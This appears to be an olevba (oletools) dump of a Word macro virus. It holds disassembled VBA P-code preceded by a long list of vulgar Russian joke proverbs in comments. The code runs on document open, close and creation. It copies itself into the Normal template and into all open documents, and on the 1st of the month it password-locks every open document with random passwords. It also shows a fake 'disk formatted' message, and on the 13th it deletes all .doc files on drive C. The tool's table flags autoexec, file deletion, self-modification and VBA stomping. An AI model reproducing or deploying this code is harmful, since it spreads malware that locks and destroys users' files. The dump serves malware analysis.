' Line #415:
' 	QuoteRem 0x0000 0x0033 "Чем бы дитя не тешилось, лишь бы своих не наделало."
' Line #416:
' 	QuoteRem 0x0000 0x002A "Чем дальше в лес - тем больше извращенцев."
' Line #417:
' 	QuoteRem 0x0000 0x0022 "Чем дальше в лес, тем ближе вылез."
' Line #418:
' 	QuoteRem 0x0000 0x0024 "Чем дальше в лес, тем ну его на хуй!"
' Line #419:
' 	QuoteRem 0x0000 0x0025 "Чем дальше в лес, тем толще партизаны"
' Line #420:
' 	QuoteRem 0x0000 0x0023 "Чем дальше в лес, тем третий лишний"
' Line #421:
' 	QuoteRem 0x0000 0x0020 "Чем дальше влез, тем ближе вылез"
' Line #422:
' 	QuoteRem 0x0000 0x0036 "Чем меньше девушек мы любим, тем больше времени на сон"
' Line #423:
' 	QuoteRem 0x0000 0x001B "Чем удобряли, то и выросло."
' Line #424:
' 	QuoteRem 0x0000 0x0029 "Чем шире наши морды, тем теснее наши ряды"
' Line #425:
' 	QuoteRem 0x0000 0x002B "Что в имени тебе моем, ты оцени груди объем"
' Line #426:
' 	QuoteRem 0x0000 0x001D "Что в рот влезло, то полезно."
' Line #427:
' 	QuoteRem 0x0000 0x0016 "Что в рот, что по лбу!"
' Line #428:
' 	QuoteRem 0x0000 0x0024 "Что естественно - то не без оргазма."
' Line #429:
' 	QuoteRem 0x0000 0x001F "Что посеешь, то уже не найдешь!"
' Line #430:
' 	QuoteRem 0x0000 0x001A "Что посмеешь, то и пожмешь"
' Line #431:
' 	QuoteRem 0x0000 0x0023 "Что с возу упало - тому и глаз вон."
' Line #432:
' 	QuoteRem 0x0000 0x0029 "Что с возу упало, то не вырубишь топором."
' Line #433:
' 	QuoteRem 0x0000 0x001B "Чтоб ты жил на одну рекламу"
' Line #434:
' 	QuoteRem 0x0000 0x0029 "Чтобы узнать перспективу надо ее пощупать"
' Line #435:
' 	QuoteRem 0x0000 0x0043 "Чья бы корова мычала, а твоя бы засунула палец в жопу и не пиздела!"
' Line #436:
' 	QuoteRem 0x0000 0x0023 "Шило - не воpобей, в лес не убежит."
' Line #437:
' 	QuoteRem 0x0000 0x0033 "Шило в мешке не утаишь - все равно наверх всплывет!"
' Line #438:
' 	QuoteRem 0x0000 0x001D "Щи да каша - сладкая парочка."
' Line #439:
' 	QuoteRem 0x0000 0x0035 "Экипаж прощается с вами и желает Вам приятного полета"
' Line #440:
' 	QuoteRem 0x0000 0x0023 "Это все шито по воде белыми вилами."
' Line #441:
' 	QuoteRem 0x0000 0x001E "Это еще писями по воде виляно."
' Line #442:
' 	QuoteRem 0x0000 0x0023 "Эх, хорошо, когда хорошо кончается!"
' Line #443:
' 	QuoteRem 0x0000 0x0028 "Юноши и девушки, овладевайте друг другом"
' Line #444:
' 	QuoteRem 0x0000 0x001C "Я Вас любил, деревья гнулись"
' Line #445:
' 	QuoteRem 0x0000 0x0039 "Я знаю каратэ, тыквандо, дзюдо и еще мноого страшных СЛОВ"
' Line #446:
' 	QuoteRem 0x0000 0x0031 "Я люблю тебя, жизнь, ну а ты меня - снова и снова"
' Line #447:
' 	QuoteRem 0x0000 0x001B "Я милого узнаю по колготкам"
' Line #448:
' 	QuoteRem 0x0000 0x0013 "Я на тебе - никогда"
' Line #449:
' 	QuoteRem 0x0000 0x0056 "Я наклонился посмотреть, не наклонилась ли она, чтоб посмотреть, не наклонился ли я..."
' Line #450:
' 	QuoteRem 0x0000 0x002A "Я не сплю с утками и с курами тоже не сплю"
' Line #451:
' 	QuoteRem 0x0000 0x0026 "Я себя не люблю, просто очень нравлюсь"
' Line #452:
' 	QuoteRem 0x0000 0x003B "Я сегодня не такой, как вчера (а вчера я был ваще никакой!)"
' Line #453:
' 	QuoteRem 0x0000 0x0027 "Я сухой закон блял, бляду и блядь буду!"
' Line #454:
' 	QuoteRem 0x0000 0x0017 "Язык до киллера доведет"
' Line #455:
' 	QuoteRem 0x0000 0x0017 "Язык до клитера доведёт"
' Line #456:
' 	QuoteRem 0x0000 0x0022 "Яйца в мундирах, картошка всмятку."
' Line #457:
' 	QuoteRem 0x0000 0x001A "Яйца курицу дисциплинируют"
' Line #458:
' 	QuoteRem 0x0000 0x0017 "Яйца ломаного не стоит."
' Line #459:
' 	QuoteRem 0x0000 0x001F "Яйцо от курицы недалеко падает."
' Line #460:
' 	QuoteRem 0x0000 0x0021 "Ямщик, не гони! Ты гонишь, ямщик!"
' Line #461:
' 	FuncDefn (Private Sub Document_Open())
' Line #462:
' 	Dim 
' 	VarDefn sgn1 (As String)
' Line #463:
' 	Dim 
' 	VarDefn sgn2 (As String)
' Line #464:
' 	Dim 
' 	VarDefn st (As String)
' Line #465:
' 	Dim 
' 	VarDefn B (As Boolean)
' Line #466:
' 	LitStr 0x0008 "'Pupkin'"
' 	St sgn1 
' Line #467:
' 	LitStr 0x0007 "'Vasya'"
' 	St sgn2 
' Line #468:
' 	LitVarSpecial (False)
' 	St B 
' Line #469:
' 	OnError er 
' Line #470:
' 	LitStr 0x000B "c:\~sgn.^&#"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #471:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld st 
' 	InputItem 
' 	InputDone 
' Line #472:
' 	Ld st 
' 	LitStr 0x000D "ACCESS DENiED"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St B 
' 	EndIf 
' Line #473:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #474:
' 	Label er 
' Line #475:
' 	Ld B 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Eq 
' 	Paren 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sgn1 
' 	Ne 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #476:
' 	OnError (Resume Next) 
' Line #477:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sgn1 
' 	Ne 
' 	IfBlock 
' Line #478:
' 	LineCont 0x0008 0C 00 04 00 1A 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #479:
' 	EndIfBlock 
' Line #480:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #481:
' 	LineCont 0x000C 0C 00 04 00 1A 00 04 00 26 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #482:
' 	EndIfBlock 
' Line #483:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #484:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #485:
' 	LineCont 0x0004 20 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sgn1 
' 	Ne 
' 	Paren 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sgn2 
' 	Ne 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #486:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #487:
' 	EndIfBlock 
' Line #488:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #489:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #490:
' 	EndIfBlock 
' Line #491:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #492:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #493:
' 	EndIfBlock 
' Line #494:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #495:
' 	ArgsCall Read 0x0000 
' Line #496:
' Line #497:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #498:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x002D 0x0000 ""
' Line #499:
' 	LineCont 0x0008 0B 00 05 00 27 00 05 00
' 	LitDI2 0x00DC 
' 	ArgsLd Rnd 0x0000 
' 	Mul 
' 	LitDI2 0x0023 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x00DC 
' 	ArgsLd Rnd 0x0000 
' 	Mul 
' 	LitDI2 0x0023 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitDI2 0x00DC 
' 	ArgsLd Rnd 0x0000 
' 	Mul 
' 	LitDI2 0x0023 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitDI2 0x00DC 
' 	ArgsLd Rnd 0x0000 
' 	Mul 
' 	LitDI2 0x0023 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Password 
' Line #500:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #501:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #502:
' 	EndIfBlock 
' Line #503:
' Line #504:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x01CC 
' 	Mul 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #505:
' Line #506:
' 	ArgsLd Time 0x0000 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	ArgsLd Time 0x0000 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #507:
' 	LitStr 0x001B "Диск успешно отформатирован"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #508:
' 	EndIfBlock 
' Line #509:
' Line #510:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #511:
' 	LitStr 0x001A "Привет от Васи Пупкина !!!"
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #512:
' 	EndIfBlock 
' Line #513:
' Line #514:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #515:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #516:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #517:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #518:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #519:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #520:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #521:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #522:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #523:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #524:
' 	Ld I 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #525:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #526:
' 	EndIfBlock 
' Line #527:
' 	EndWith 
' Line #528:
' 	EndIfBlock 
' Line #529:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld B 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Запись запрещена"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #530:
' 	EndIfBlock 
' Line #531:
' 	EndSub 
' Line #532:
' 	FuncDefn (Private Sub Document_Close())
' Line #533:
' 	ArgsCall Document_Open 0x0000 
' Line #534:
' 	EndSub 
' Line #535:
' 	FuncDefn (Private Sub Document_New())
' Line #536:
' 	ArgsCall Document_Open 0x0000 
' Line #537:
' 	EndSub 
' Line #538:
' Line #539:
' Line #540:
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' Line #545:
' Line #546:
' Line #547:
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' Line #556:
' Line #557:
' Line #558:
' Line #559:
' Line #560:
' Line #561:
' Line #562:
' Line #563:
' Line #564:
' Line #565:
' Line #566:
' Line #567:
' Line #568:
' Line #569:
' Line #570:
' Line #571:
' Line #572:
' Line #573:
' Line #574:
' Line #575:
' Line #576:
' Line #577:
' Line #578:
' Line #579:
' Line #580:
' Line #581:
' Line #582:
' Line #583:
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' Line #588:
' Line #589:
' Line #590:
' Line #591:
' Line #592:
' Line #593:
' Line #594:
' Line #595:
' Line #596:
' Line #597:
' Line #598:
' Line #599:
' Line #600:
' Line #601:
' Line #602:
' Line #603:
' Line #604:
' Line #605:
' Line #606:
' Line #607:
' Line #608:
' Line #609:
' Line #610:
' Line #611:
' Line #612:
' Line #613:
' Line #614:
' Line #615:
' Line #616:
' Line #617:
' Line #618:
' Line #619:
' Line #620:
' Line #621:
' Line #622:
' Line #623:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

